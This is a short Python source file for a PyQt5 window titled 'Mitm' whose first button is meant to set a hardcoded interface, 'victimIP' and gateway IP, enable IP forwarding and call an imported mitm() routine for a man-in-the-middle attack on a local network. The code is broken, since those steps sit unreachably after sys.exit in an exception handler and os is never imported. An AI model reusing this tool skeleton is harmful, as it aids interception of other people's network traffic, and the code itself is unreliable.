import sys
from os import geteuid
from PyQt5.QtWidgets import QWidget, QPushButton, QApplication
from mitm import *

class Main(QWidget):
    
    def __init__(self):
        super().__init__()
        self.initUI()
        
        
    def initUI(self):               
        exitBtn = QPushButton('Exit', self)
        exitBtn.clicked.connect(QApplication.instance().quit)
        exitBtn.resize(exitBtn.sizeHint())
        exitBtn.move(72, 150)

        func1Btn = QPushButton('Function 1', self)
        func1Btn.move(72,50)
        func1Btn.clicked.connect(self.func1)

        func2Btn = QPushButton('Function 2', self)
        func2Btn.move(72,100)
        func2Btn.clicked.connect(self.func2)
 
        self.setGeometry(800, 300, 220, 250)
        self.setWindowTitle('Mitm')
        self.show()
    
    def func1(self):
        try:
            interface = "eth0"
            victimIP = "192.168.0.22"
            gateIP = "192.168.0.2"
        except KeyboardInterrupt:
            print("\n[*] User Requested Shutdown")
            print("[*] Exiting...")
            sys.exit(1)
 
            print("\n[*] Enabling IP Forwarding...\n")
            os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
            mitm()

    def func2(self):
        print('2')
        
if __name__ == '__main__':
    app = QApplication(sys.argv)
    run = Main()
    sys.exit(app.exec_())